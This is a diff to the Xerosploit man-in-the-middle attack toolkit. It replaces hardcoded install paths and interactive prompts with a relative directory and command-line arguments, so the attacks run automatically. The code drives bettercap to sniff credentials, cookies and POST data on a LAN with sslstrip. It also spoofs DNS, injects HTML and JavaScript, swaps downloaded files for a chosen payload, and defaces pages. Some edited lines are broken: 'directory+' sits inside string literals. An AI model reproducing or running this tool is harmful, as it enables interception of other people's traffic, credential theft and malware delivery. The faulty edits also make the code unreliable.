@@ -28,6 +28,10 @@ from tabulate import tabulate
 from banner import xe_header
 import sys, traceback
 from time import sleep
+import os
+
+directory = os.path.dirname(os.path.abspath(__file__))
+
 
 #Check if the script is running as root .
 if not os.geteuid() == 0:
@@ -41,14 +45,14 @@ def main():
 #Configure the network interface and gateway. 
 		def config0():
 			global up_interface
-			up_interface = open('/opt/xerosploit/tools/files/iface.txt', 'r').read()
+			up_interface = open(directory+'/tools/files/iface.txt', 'r').read()
 			up_interface = up_interface.replace("\n","")
 			if up_interface == "0":
 				up_interface = os.popen("route | awk '/Iface/{getline; print $8}'").read()
 				up_interface = up_interface.replace("\n","")
 
 			global gateway
-			gateway = open('/opt/xerosploit/tools/files/gateway.txt', 'r').read()
+			gateway = open(directory+'/tools/files/gateway.txt', 'r').read()
 			gateway = gateway.replace("\n","")
 			if gateway == "0":
 				gateway = os.popen("ip route show | grep -i 'default via'| awk '{print $3 }'").read()
@@ -106,15 +110,15 @@ def main():
 
 			scan = os.popen("nmap " + gateway + "/24 -n -sP ").read()
 
-			f = open('/opt/xerosploit/tools/log/scan.txt','w')
+			f = open(directory+'/tools/log/scan.txt','w')
 			f.write(scan)
 			f.close()
 
-			devices = os.popen(" grep report /opt/xerosploit/tools/log/scan.txt | awk '{print $5}'").read()
+			devices = os.popen(" grep report "+directory+"/tools/log/scan.txt | awk '{print $5}'").read()
 
-			devices_mac = os.popen("grep MAC /opt/xerosploit/tools/log/scan.txt | awk '{print $3}'").read() + os.popen("ip addr | grep 'state UP' -A1 | tail -n1 | awk '{print $2}' | cut -f1  -d'/'").read().upper() # get devices mac and localhost mac address
+			devices_mac = os.popen("grep MAC "+directory+"/tools/log/scan.txt | awk '{print $3}'").read() + os.popen("ip addr | grep 'state UP' -A1 | tail -n1 | awk '{print $2}' | cut -f1  -d'/'").read().upper() # get devices mac and localhost mac address
 
-			devices_name = os.popen("grep MAC /opt/xerosploit/tools/log/scan.txt | awk '{print $4 ,S$5 $6}'").read() + "\033[1;32m(This device)\033[1;m"
+			devices_name = os.popen("grep MAC "+directory+"/tools/log/scan.txt | awk '{print $4 ,S$5 $6}'").read() + "\033[1;32m(This device)\033[1;m"
 
 			
 			table_data = [
@@ -135,7 +139,7 @@ def main():
 			target_parse = " --target " # Bettercap target parse . This variable will be wiped if the user want to perform MITM ATTACK on all the network. 
 
 			print ("\033[1;32m\n[+] Please choose a target (e.g. 192.168.1.10). Enter 'help' for more information.\n\033[1;m")
-			target_ips = input("\033[1;36m\033[4mXero\033[0m\033[1;36m ➮ \033[1;m").strip()
+			target_ips = sys.argv[1].strip()
 			
 			if target_ips == "back":
 				home()
@@ -157,7 +161,7 @@ def main():
 				def option():
 					""" Choose a module """
 					print("\033[1;32m\n[+] Which module do you want to load ? Enter 'help' for more information.\n\033[1;m")
-					options = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m\033[1;36m ➮ \033[1;m").strip() # select an option , port scan , vulnerability scan .. etc...
+					options = sys.argv[2].strip() # select an option , port scan , vulnerability scan .. etc...
 					# Port scanner
 					if options == "pscan":
 						print(""" \033[1;36m
@@ -177,7 +181,7 @@ def main():
 							
 
 							print("\033[1;32m\n[+] Enter 'run' to execute the 'pscan' command.\n\033[1;m")
-							action_pscan = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mpscan\033[0m\033[1;36m ➮ \033[1;m").strip()#ip to scan
+							action_pscan ="run"#ip to scan
 							if action_pscan == "back":
 								option()
 							elif action_pscan == "exit":
@@ -190,20 +194,20 @@ def main():
 								print("\033[1;34m\n[++] Please wait ... Scanning ports on " + target_name + " \033[1;m")
 								scan_port = os.popen("nmap "+ target_ips + " -Pn" ).read()
 
-								save_pscan = open('/opt/xerosploit/tools/log/pscan.txt','w') # Save scanned ports result.
+								save_pscan = open(directory+'/tools/log/pscan.txt','w') # Save scanned ports result.
 								save_pscan.write(scan_port)
 								save_pscan.close()
 
 								# Grep port scan information
-								ports = os.popen("grep open /opt/xerosploit/tools/log/pscan.txt | awk '{print $1}'" ).read().upper() # open ports
-								ports_services = os.popen("grep open /opt/xerosploit/tools/log/pscan.txt | awk '{print $3}'" ).read().upper() # open ports services
-								ports_state = os.popen("grep open /opt/xerosploit/tools/log/pscan.txt | awk '{print $2}'" ).read().upper() # port state
+								ports = os.popen("grep open "+directory+"/tools/log/pscan.txt | awk '{print $1}'" ).read().upper() # open ports
+								ports_services = os.popen("grep open "+directory+"/tools/log/pscan.txt | awk '{print $3}'" ).read().upper() # open ports services
+								ports_state = os.popen("grep open "+directory+"/tools/log/pscan.txt | awk '{print $2}'" ).read().upper() # port state
 
 
 
 								# Show the result of port scan
 
-								check_open_port = os.popen("grep SERVICE /opt/xerosploit/tools/log/pscan.txt | awk '{print $2}'" ).read().upper() # check if all port ara closed with the result
+								check_open_port = os.popen("grep SERVICE "+directory+"/tools/log/pscan.txt | awk '{print $2}'" ).read().upper() # check if all port ara closed with the result
 								if check_open_port == "STATE\n": 
 
 									table_data = [
@@ -246,7 +250,7 @@ def main():
 							print("\033[1;32m\n[+] Enter 'run' to execute the 'dos' command.\n\033[1;m")
 							
 
-							action_dos = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdos\033[0m\033[1;36m ➮ \033[1;m").strip() 
+							action_dos = "run"
 
 							if action_dos == "back":
 								option()
@@ -284,7 +288,7 @@ def main():
 							
 							print("\033[1;32m\n[+] Enter 'run' to execute the 'ping' command.\n\033[1;m")
 
-							action_ping = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mping\033[0m\033[1;36m ➮ \033[1;m").strip() 
+							action_ping = "run" 
 
 							if action_ping == "back":
 								option()
@@ -295,14 +299,14 @@ def main():
 							elif action_ping == "run":
 								print("\033[1;34m\n[++] PING " + target_ips + " (" + target_ips + ") 56(84) bytes of data ... \n\033[1;m")
 								ping_cmd = os.popen("ping -c 5 " + target_ips).read()
-								fping = open('/opt/xerosploit/tools/log/ping.txt','w') #Save ping result , then grep some informations.
+								fping = open(directory+'/tools/log/ping.txt','w') #Save ping result , then grep some informations.
 								fping.write(ping_cmd)
 								fping.close()
 
-								ping_transmited = os.popen("grep packets /opt/xerosploit/tools/log/ping.txt | awk '{print $1}'").read()
-								ping_receive = os.popen("grep packets /opt/xerosploit/tools/log/ping.txt | awk '{print $4}'").read()
-								ping_lost = os.popen("grep packets /opt/xerosploit/tools/log/ping.txt | awk '{print $6}'").read()
-								ping_time = os.popen("grep packets /opt/xerosploit/tools/log/ping.txt | awk '{print $10}'").read()
+								ping_transmited = os.popen("grep packets "+directory+"/tools/log/ping.txt | awk '{print $1}'").read()
+								ping_receive = os.popen("grep packets "+directory+"/tools/log/ping.txt | awk '{print $4}'").read()
+								ping_lost = os.popen("grep packets "+directory+"/tools/log/ping.txt | awk '{print $6}'").read()
+								ping_time = os.popen("grep packets "+directory+"/tools/log/ping.txt | awk '{print $10}'").read()
 
 								table_data = [
 				    				['Transmitted', 'Received', 'Loss','Time'],
@@ -328,7 +332,7 @@ def main():
 └══════════════════════════════════════════════════════════════┘     \033[1;m""")
 						def inject_html():
 							print("\033[1;32m\n[+] Enter 'run' to execute the 'injecthtml' command.\n\033[1;m")
-							action_inject = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4minjecthtml\033[0m\033[1;36m ➮ \033[1;m").strip() 
+							action_inject ="run"
 							if action_inject == "back":
 								option()
 							elif action_inject == "exit":
@@ -337,8 +341,10 @@ def main():
 								home()
 							elif action_inject == "run":
 								print("\033[1;32m\n[+] Specify the file containing html code you would like to inject.\n\033[1;m")
-								html_file = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mInjecthtml\033[0m\033[1;36m ➮ \033[1;m")
-								
+								if len(sys.argv)==4:
+									html_file =sys.argv[3]
+								else:
+									html_file =input()
 								if html_file == "back":
 									inject_html()
 								elif html_file == "home":
@@ -348,8 +354,8 @@ def main():
 									html_file = html_file.replace("'","")
 									print("\033[1;34m\n[++] Injecting Html code ... \033[1;m")
 									print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
-									cmd_code = os.system("cp " + html_file + " /opt/xerosploit/tools/bettercap/modules/tmp/file.html")
-									cmd_inject = os.system("xettercap " + target_parse + target_ips + " --proxy-module=/opt/xerosploit/tools/bettercap/lib/bettercap/proxy/http/modules/injecthtml.rb --js-file " + html_file + " -I " + up_interface + " --gateway " + gateway )
+									cmd_code = os.system("cp " + html_file + " "+directory+"/tools/bettercap/modules/tmp/file.html")
+									cmd_inject = os.system("xettercap " + target_parse + target_ips + " --proxy-module="+directory+"/tools/bettercap/lib/bettercap/proxy/http/modules/injecthtml.rb --js-file " + html_file + " -I " + up_interface + " --gateway " + gateway )
 
 									inject_html()
 
@@ -369,7 +375,7 @@ def main():
 └══════════════════════════════════════════════════════════════┘     \033[1;m""")
 						def rdownload():
 							print("\033[1;32m\n[+] Please type 'run' to execute the 'rdownload' command.\n\033[1;m")
-							action_rdownload = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mrdownload\033[0m\033[1;36m ➮ \033[1;m").strip() 
+							action_rdownload ="run"
 							if action_rdownload == "back":
 								option()
 							elif action_rdownload == "exit":
@@ -377,7 +383,7 @@ def main():
 							elif action_rdownload == "home":
 								home()
 							elif action_rdownload == "run":
-								module = "/opt/xerosploit/tools/bettercap/modules/http/replace_file.rb"
+								module = ""+directory+"/tools/bettercap/modules/http/replace_file.rb"
 								print("\033[1;32m\n[+] Specify the extension of the files to replace. (e.g. exe)\n\033[1;m")
 								ext_rdownload = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mrdownload\033[0m\033[1;36m ➮ \033[1;m").strip()
 								print("\033[1;32m\n[+] Set the file to use in order to replace the ones matching the extension.\n\033[1;m")
@@ -393,7 +399,7 @@ def main():
 								
 									print("\033[1;34m\n[++] All ." + ext_rdownload + " files will be replaced by " + file_rdownload + "  \033[1;m")
 									print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
-									cmd_rdownload = os.system("xettercap " + target_parse + target_ips + " --proxy-module='/opt/xerosploit/tools/bettercap/modules/replace_file.rb' --file-extension " + ext_rdownload + " --file-replace " + file_rdownload + " -I " + up_interface + " --gateway " + gateway )
+									cmd_rdownload = os.system("xettercap " + target_parse + target_ips + " --proxy-module=directory+'/tools/bettercap/modules/replace_file.rb' --file-extension " + ext_rdownload + " --file-replace " + file_rdownload + " -I " + up_interface + " --gateway " + gateway )
 									rdownload()						
 							else:
 								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
@@ -410,7 +416,7 @@ def main():
 
 						def snif():
 							print("\033[1;32m\n[+] Please type 'run' to execute the 'sniff' command.\n\033[1;m")
-							action_snif = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4msniff\033[0m\033[1;36m ➮ \033[1;m").strip()
+							action_snif = "run"
 							if action_snif == "back":
 								option()
 							elif action_snif == "exit":
@@ -421,9 +427,9 @@ def main():
 								def snif_sslstrip():
 
 									print("\033[1;32m\n[+] Do you want to load sslstrip ? (y/n).\n\033[1;m")
-									action_snif_sslstrip = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4msniff\033[0m\033[1;36m ➮ \033[1;m").strip()
+									action_snif_sslstrip = "y"
 									if action_snif_sslstrip == "y":
-										print("\033[1;34m\n[++] All logs are saved on : /opt/xerosploit/xerosniff \033[1;m")
+										print("\033[1;34m\n[++] All logs are saved on : "+directory+"/xerosniff \033[1;m")
 										print("\033[1;34m\n[++] Sniffing on " + target_name + "\033[1;m")
 										print("\033[1;34m\n[++] sslstrip : \033[1;32mON\033[0m \033[1;m")
 										print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
@@ -431,14 +437,14 @@ def main():
 										date = os.popen("""date | awk '{print $2"-"$3"-"$4}'""").read()
 										filename = target_ips + date
 										filename = filename.replace("\n","")
-										make_file = os.system("mkdir -p /opt/xerosploit/xerosniff && cd /opt/xerosploit/xerosniff && touch " + filename + ".log")
-										cmd_show_log = os.system("""xterm -geometry 100x24 -T 'Xerosploit' -hold -e "tail -f /opt/xerosploit/xerosniff/""" + filename + """.log  | GREP_COLOR='01;36' grep --color=always -E '""" + target_ips +  """|DNS|COOKIE|POST|HEADERS|BODY|HTTPS|HTTP|MQL|SNPP|DHCP|WHATSAPP|RLOGIN|IRC|SNIFFER|PGSQL|NNTP|DICT|HTTPAUTH|TEAMVIEWER|MAIL|SNMP|MPD|NTLMSS|FTP|REDIS|GET|$'" > /dev/null 2>&1 &""")
-										cmd_snif = os.system("xettercap --proxy " + target_parse + target_ips + " -P MYSQL,SNPP,DHCP,WHATSAPP,RLOGIN,IRC,HTTPS,POST,PGSQL,NNTP,DICT,HTTPAUTH,TEAMVIEWER,MAIL,SNMP,MPD,COOKIE,NTLMSS,FTP,REDIS -I " + up_interface + " --gateway " + gateway + " -O, --log /opt/xerosploit/xerosniff/" + filename + ".log --sniffer-output /opt/xerosploit/xerosniff/" + filename + ".pcap")
+										make_file = os.system("mkdir -p "+directory+"/xerosniff && cd "+directory+"/xerosniff && touch " + filename + ".log")
+										cmd_show_log = os.system("""xterm -geometry 100x24 -T 'Xerosploit' -hold -e "tail -f "+directory+"/xerosniff/""" + filename + """.log  | GREP_COLOR='01;36' grep --color=always -E '""" + target_ips +  """|DNS|COOKIE|POST|HEADERS|BODY|HTTPS|HTTP|MQL|SNPP|DHCP|WHATSAPP|RLOGIN|IRC|SNIFFER|PGSQL|NNTP|DICT|HTTPAUTH|TEAMVIEWER|MAIL|SNMP|MPD|NTLMSS|FTP|REDIS|GET|$'" > /dev/null 2>&1 &""")
+										cmd_snif = os.system("xettercap --proxy " + target_parse + target_ips + " -P MYSQL,SNPP,DHCP,WHATSAPP,RLOGIN,IRC,HTTPS,POST,PGSQL,NNTP,DICT,HTTPAUTH,TEAMVIEWER,MAIL,SNMP,MPD,COOKIE,NTLMSS,FTP,REDIS -I " + up_interface + " --gateway " + gateway + " -O, --log "+directory+"/xerosniff/" + filename + ".log --sniffer-output "+directory+"/xerosniff/" + filename + ".pcap")
 										def snifflog():
 											print("\033[1;32m\n[+] Do you want to save logs ? (y/n).\n\033[1;m")
-											action_log = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4msniff\033[0m\033[1;36m ➮ \033[1;m").strip()
+											action_log = "y"
 											if action_log == "n":
-												cmd_log = os.system("rm /opt/xerosploit/xerosniff/" + filename + ".*")
+												cmd_log = os.system("rm "+directory+"/xerosniff/" + filename + ".*")
 												print("\033[1;31m\n[++] Logs have been removed. \n\033[1;m")
 												sleep(1)
 												snif()
@@ -458,7 +464,7 @@ def main():
 										snifflog()
 
 									elif action_snif_sslstrip == "n":
-										print("\033[1;34m\n[++] All logs are saved on : /opt/xerosploit/xerosniff \033[1;m")
+										print("\033[1;34m\n[++] All logs are saved on : "+directory+"/xerosniff \033[1;m")
 										print("\033[1;34m\n[++] Sniffing on " + target_name + "\033[1;m")
 										print("\033[1;34m\n[++] sslstrip : \033[1;91mOFF\033[0m \033[1;m")
 										print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
@@ -466,16 +472,16 @@ def main():
 										date = os.popen("""date | awk '{print $2"-"$3"-"$4}'""").read()
 										filename = target_ips + date
 										filename = filename.replace("\n","")
-										make_file = os.system("mkdir -p /opt/xerosploit/xerosniff && cd /opt/xerosploit/xerosniff && touch " + filename + ".log")
-										cmd_show_log = os.system("""xterm -geometry 100x24 -T 'Xerosploit' -hold -e "tail -f /opt/xerosploit/xerosniff/""" + filename + """.log  | GREP_COLOR='01;36' grep --color=always -E '""" + target_ips +  """|DNS|COOKIE|POST|HEADERS|BODY|HTTPS|HTTP|MQL|SNPP|DHCP|WHATSAPP|RLOGIN|IRC|SNIFFER|PGSQL|NNTP|DICT|HTTPAUTH|TEAMVIEWER|MAIL|SNMP|MPD|NTLMSS|FTP|REDIS|GET|$'" > /dev/null 2>&1 &""")
-										cmd_snif = os.system("xettercap " + target_parse + target_ips + " -P MYSQL,SNPP,DHCP,WHATSAPP,RLOGIN,IRC,HTTPS,POST,PGSQL,NNTP,DICT,HTTPAUTH,TEAMVIEWER,MAIL,SNMP,MPD,COOKIE,NTLMSS,FTP,REDIS -I " + up_interface + " --gateway " + gateway + " -O, --log /opt/xerosploit/xerosniff/" + filename + ".log --sniffer-output /opt/xerosploit/xerosniff/" + filename + ".pcap")
+										make_file = os.system("mkdir -p "+directory+"/xerosniff && cd "+directory+"/xerosniff && touch " + filename + ".log")
+										cmd_show_log = os.system("""xterm -geometry 100x24 -T 'Xerosploit' -hold -e "tail -f "+directory+"/xerosniff/""" + filename + """.log  | GREP_COLOR='01;36' grep --color=always -E '""" + target_ips +  """|DNS|COOKIE|POST|HEADERS|BODY|HTTPS|HTTP|MQL|SNPP|DHCP|WHATSAPP|RLOGIN|IRC|SNIFFER|PGSQL|NNTP|DICT|HTTPAUTH|TEAMVIEWER|MAIL|SNMP|MPD|NTLMSS|FTP|REDIS|GET|$'" > /dev/null 2>&1 &""")
+										cmd_snif = os.system("xettercap " + target_parse + target_ips + " -P MYSQL,SNPP,DHCP,WHATSAPP,RLOGIN,IRC,HTTPS,POST,PGSQL,NNTP,DICT,HTTPAUTH,TEAMVIEWER,MAIL,SNMP,MPD,COOKIE,NTLMSS,FTP,REDIS -I " + up_interface + " --gateway " + gateway + " -O, --log "+directory+"/xerosniff/" + filename + ".log --sniffer-output "+directory+"/xerosniff/" + filename + ".pcap")
 
 										
 										def snifflog():
 											print("\033[1;32m\n[+] Do you want to save logs ? (y/n).\n\033[1;m")
-											action_log = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4msniff\033[0m\033[1;36m ➮ \033[1;m").strip()
+											action_log ="y"
 											if action_log == "n":
-												cmd_log = os.system("rm /opt/xerosploit/xerosniff/" + filename + ".*")
+												cmd_log = os.system("rm "+directory+"/xerosniff/" + filename + ".*")
 												print("\033[1;31m\n[++] Logs have been removed. \n\033[1;m")
 												sleep(1)
 												snif()
@@ -522,7 +528,7 @@ def main():
 └══════════════════════════════════════════════════════════════┘     \033[1;m""")
 						def dspoof():
 							print("\033[1;32m\n[+] Enter 'run' to execute the 'dspoof' command.\n\033[1;m")
-							action_dspoof = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdspoof\033[0m\033[1;36m ➮ \033[1;m").strip()
+							action_dspoof ="run"
 							if action_dspoof == "back":
 								option()
 							elif action_dspoof == "exit":
@@ -531,16 +537,20 @@ def main():
 								home()
 							elif action_dspoof == "run":
 								print("\033[1;32m\n[+] Enter the IP address where you want to redirect the traffic.\n\033[1;m")
-								action_dspoof_ip = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdspoof\033[0m\033[1;36m ➮ \033[1;m").strip()
+								if len(sys.argv)==4:
+									action_dspoof_ip =sys.argv[3]
+								else:
+									action_dspoof_ip =input()
+								 
 								dns_conf = action_dspoof_ip + " .*\.*"
-								outdns = open('/opt/xerosploit/tools/files/dns.conf','w')
+								outdns = open(directory+'/tools/files/dns.conf','w')
 								outdns.write(dns_conf)
 								outdns.close()
 
 								print("\033[1;34m\n[++] Redirecting all the traffic to " + action_dspoof_ip + " ... \033[1;m")
 								print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
 
-								cmd_dspoof = os.system("xettercap " + target_parse + target_ips + " --dns /opt/xerosploit/tools/files/dns.conf --custom-parser DNS -I " + up_interface + " --gateway " + gateway)
+								cmd_dspoof = os.system("xettercap " + target_parse + target_ips + " --dns "+directory+"/tools/files/dns.conf --custom-parser DNS -I " + up_interface + " --gateway " + gateway)
 								dspoof()
 							else:
 								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
@@ -556,7 +566,7 @@ def main():
 └══════════════════════════════════════════════════════════════┘     \033[1;m""")
 						def yplay():
 							print("\033[1;32m\n[+] Enter 'run' to execute the 'yplay' command.\n\033[1;m")
-							action_yplay = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4myplay\033[0m\033[1;36m ➮ \033[1;m").strip()
+							action_yplay ="run"
 							if action_yplay == "back":
 								option()
 							elif action_yplay == "exit":
@@ -565,7 +575,11 @@ def main():
 								home()
 							elif action_yplay == "run":
 								print("\033[1;32m\n[+] Insert a youtube video ID. (e.g. NvhZu5M41Z8)\n\033[1;m")
-								video_id = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4myplay\033[0m\033[1;36m ➮ \033[1;m").strip()
+								if len(sys.argv)==4:
+									video_id =sys.argv[3]
+								else:
+									video_id =input()
+		
 								if video_id == "back":
 									option()
 								elif video_id == "": # if raw = null
@@ -577,12 +591,12 @@ def main():
 									home()
 								else:
 									code = "<head> <iframe width='0' height='0' src='http://www.youtube.com/embed/" + video_id + "?autoplay=1' frameborder='0' allowfullscreen></iframe>"
-									code_yplay = open('/opt/xerosploit/tools/bettercap/modules/tmp/yplay.txt','w')
+									code_yplay = open(directory+'/tools/bettercap/modules/tmp/yplay.txt','w')
 									code_yplay.write(code)
 									code_yplay.close()
 									print("\033[1;34m\n[++] PLaying : https://www.youtube.com/watch?v=" + video_id + " \033[1;m")
 									print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
-									cmd_yplay = os.system("xettercap " + target_parse + target_ips + " --proxy-module='/opt/xerosploit/tools/bettercap/modules/rickroll.rb' -I " + up_interface + " --gateway " + gateway)
+									cmd_yplay = os.system("xettercap " + target_parse + target_ips + " --proxy-module=directory+'/tools/bettercap/modules/rickroll.rb' -I " + up_interface + " --gateway " + gateway)
 									yplay()
 							else:
 								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
@@ -600,7 +614,7 @@ def main():
 └══════════════════════════════════════════════════════════════┘     \033[1;m""")
 						def replace():
 							print("\033[1;32m\n[+] Enter 'run' to execute the 'replace' command.\n\033[1;m")
-							action_replace = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mreplace\033[0m\033[1;36m ➮ \033[1;m").strip()
+							action_replace = "run"
 							if action_replace == "back":
 								option()
 							elif action_replace == "exit":
@@ -609,7 +623,11 @@ def main():
 								home()
 							elif action_replace == "run":
 								print("\033[1;32m\n[+] Insert your image path. (e.g. /home/capitansalami/pictures/fun.png)\n\033[1;m")
-								img_replace = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mreplace\033[0m\033[1;36m ➮ \033[1;m")
+								if len(sys.argv)==4:
+									img_replace =sys.argv[3]
+								else:
+									img_replace =input()
+								
 								img_replace = img_replace.replace("'","")
 								if img_replace == "back":
 									replace()
@@ -620,12 +638,12 @@ def main():
 								else:
 									from PIL import Image
 									img = Image.open(img_replace)
-									img.save('/opt/xerosploit/tools/bettercap/modules/tmp/ximage.png')
+									img.save(directory+'/tools/bettercap/modules/tmp/ximage.png')
 									print("\033[1;34m\n[++] All images will be replaced by " + img_replace + "\033[1;m")
 									print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
 									
 
-									cmd_replace = os.system("xettercap " + target_parse + target_ips + " --proxy-module='/opt/xerosploit/tools/bettercap/modules/replace_images.rb' --httpd --httpd-path /opt/xerosploit/tools/bettercap/modules/tmp/ -I " + up_interface + " --gateway " + gateway)
+									cmd_replace = os.system("xettercap " + target_parse + target_ips + " --proxy-module=directory+'/tools/bettercap/modules/replace_images.rb' --httpd --httpd-path "+directory+"/tools/bettercap/modules/tmp/ -I " + up_interface + " --gateway " + gateway)
 
 									replace()
 							else:
@@ -645,7 +663,7 @@ def main():
 └══════════════════════════════════════════════════════════════┘     \033[1;m""")
 						def driftnet():
 							print("\033[1;32m\n[+] Enter 'run' to execute the 'driftnet' command.\n\033[1;m")
-							action_driftnet = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdriftnet\033[0m\033[1;36m ➮ \033[1;m").strip()
+							action_driftnet = "run"
 							if action_driftnet == "back":
 								option()
 							elif action_driftnet == "exit":
@@ -654,11 +672,11 @@ def main():
 								home()
 							elif action_driftnet == "run":
 								print("\033[1;34m\n[++] Capturing requested images on " + target_name + " ... \033[1;m")
-								print("\033[1;34m\n[++] All captured images will be temporarily saved in /opt/xerosploit/xedriftnet \033[1;m")
+								print("\033[1;34m\n[++] All captured images will be temporarily saved in "+directory+"/xedriftnet \033[1;m")
 								print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
-								cmd_driftnet = os.system("mkdir -p /opt/xerosploit/xedriftnet && driftnet -d /opt/xerosploit/xedriftnet > /dev/null 2>&1 &")
+								cmd_driftnet = os.system("mkdir -p "+directory+"/xedriftnet && driftnet -d "+directory+"/xedriftnet > /dev/null 2>&1 &")
 								cmd_driftnet_sniff = os.system("xettercap  -X")
-								cmd_driftnet_2 = os.system("rm -R /opt/xerosploit/xedriftnet")
+								cmd_driftnet_2 = os.system("rm -R "+directory+"/xedriftnet")
 								driftnet()
 							else:
 								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
@@ -675,7 +693,7 @@ def main():
 └══════════════════════════════════════════════════════════════┘     \033[1;m""")
 						def shakescreen():
 							print("\033[1;32m\n[+] Enter 'run' to execute the 'move' command.\n\033[1;m")
-							action_shakescreen = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mshakescreen\033[0m\033[1;36m ➮ \033[1;m").strip()
+							action_shakescreen = "run"
 							if action_shakescreen == "back":
 								option()
 							elif action_shakescreen == "exit":
@@ -685,7 +703,7 @@ def main():
 							elif action_shakescreen == "run":
 								print("\033[1;34m\n[++] Injecting shakescreen.js  ... \033[1;m")
 								print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
-								cmd_shakescreen = os.system("xettercap " + target_parse + target_ips + " --proxy-module=injectjs --js-file '/opt/xerosploit/tools/bettercap/modules/js/shakescreen.js' -I " + up_interface + " --gateway " + gateway)
+								cmd_shakescreen = os.system("xettercap " + target_parse + target_ips + " --proxy-module=injectjs --js-file directory+'/tools/bettercap/modules/js/shakescreen.js' -I " + up_interface + " --gateway " + gateway)
 								shakescreen()
 							else:
 								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
@@ -703,7 +721,7 @@ def main():
 └══════════════════════════════════════════════════════════════┘     \033[1;m""")
 						def inject_j():
 							print("\033[1;32m\n[+] Enter 'run' to execute the 'injectjs' command.\n\033[1;m")
-							action_inject_j = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4minjectjs\033[0m\033[1;36m ➮ \033[1;m").strip()
+							action_inject_j = "run"
 							if action_inject_j == "back":
 								option()
 							elif action_inject_j == "exit":
@@ -712,7 +730,11 @@ def main():
 								home()
 							elif action_inject_j == "run":
 								print("\033[1;32m\n[+] Specify the file containing js code you would like to inject.\n\033[1;m")
-								js_file = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4minjectjs\033[0m\033[1;36m ➮ \033[1;m")
+								if len(sys.argv)==4:
+									js_file =sys.argv[3]
+								else:
+									js_file =input()
+								
 								js_file = js_file.replace("'","")
 								if js_file == "back":
 									inject_j()
@@ -742,7 +764,7 @@ def main():
 └══════════════════════════════════════════════════════════════┘     \033[1;m""")
 						def deface():
 							print("\033[1;32m\n[+] Enter 'run' to execute the 'deface' command.\n\033[1;m")
-							action_deface = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdeface\033[0m\033[1;36m ➮ \033[1;m").strip()
+							action_deface = "run"
 							if action_deface == "back":
 								option()
 							elif action_deface == "exit":
@@ -753,8 +775,11 @@ def main():
 								print("\033[1;32m\n[+] Specify the file containing your defacement code .\033[1;m")
 								print("\033[1;33m\n[!] Your file should not contain Javascript code .\n\033[1;m")
 								
-								file_deface = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdeface\033[0m\033[1;36m ➮ \033[1;m")
-								
+								if len(sys.argv)==4:
+									file_deface=sys.argv[3]
+								else:
+									file_deface =input()
+																
 								if file_deface == "back":
 									option()
 								elif file_deface == "exit":
@@ -775,7 +800,7 @@ def main():
 									f1.write(content)
 									f1.close()
 
-									cmd_inject = os.system("xettercap " + target_parse + target_ips + " --proxy-module=/opt/xerosploit/tools/bettercap/lib/bettercap/proxy/http/modules/injecthtml.rb --js-file /home/home/xero-html.html -I " + up_interface + " --gateway " + gateway )
+									cmd_inject = os.system("xettercap " + target_parse + target_ips + " --proxy-module="+directory+"/tools/bettercap/lib/bettercap/proxy/http/modules/injecthtml.rb --js-file /home/home/xero-html.html -I " + up_interface + " --gateway " + gateway )
 									deface()
 							else:
 								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
@@ -863,7 +888,7 @@ deface      :  Overwrite all web pages with your HTML code\n\033[1;m"""]
